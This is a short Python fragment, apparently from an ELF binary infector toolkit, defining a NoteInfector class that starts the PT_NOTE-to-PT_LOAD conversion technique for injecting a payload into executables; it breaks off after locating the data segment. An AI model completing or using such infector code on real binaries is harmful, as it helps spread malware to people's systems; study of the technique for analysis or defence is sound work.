from infections.infector import Infector
from ELF.elf import Elf
from ELF.elf_utils import get_data_phdr
from mmap import PAGESIZE

class NoteInfector(Infector):

	def infect(self, elf_obj, infected_name, payload):

		print('[*] PT_NOTE to PT_LOAD Conversion infection.')
		print('[1] Getting data segment phdr.\n')
		data_phdr = get_data_phdr(elf_obj.phdrs)

		ds_end_adddr = data_phdr['p_vaddr'] + data_phdr['p_memsz']
		print('\t[1.1] Getting address of end of data segment: {}'
			.format(hex(ds_end_adddr)))

		print('\t[1.2] Getting file offset of end of data segment.\n')
